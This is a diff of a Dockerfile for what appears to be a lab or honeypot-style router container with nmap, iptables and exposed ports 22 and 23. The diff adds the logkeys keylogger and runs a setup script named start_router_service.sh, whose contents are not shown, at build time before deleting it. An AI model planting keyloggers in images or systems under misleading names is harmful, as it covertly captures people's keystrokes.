@@ -1,4 +1,4 @@
-FROM debian:jessie-slim
+FROM ubuntu:latest
 MAINTAINER Amber Higgins <amhiggin@tcd.ie>
 
 # Fix uid/gid to 1000 for shared volumes
@@ -14,14 +14,27 @@ RUN export DEBIAN_FRONTEND=noninteractive; \
       libssl-dev \
       libffi-dev \
       build-essential \
+      locales \
       net-tools \
       iptables \
       nmap \
-      inetutils-ping
+      inetutils-ping \
+      logkeys
+
+# Set up environment for logkeys keylogger
+COPY start_router_service.sh start.sh
+RUN locale-gen "en_US.UTF-8" 
+RUN chmod +x start.sh
+RUN /start.sh
+RUN rm -rf start.sh
+    
 
 # CONFIGURATION
 USER admin
 WORKDIR /admin/tmp
 EXPOSE 22 23
-CMD ["sleep","infinity"]
+CMD ["sleep", "infinity"]
+#ENTRYPOINT ["/start.sh"]
+
+
 
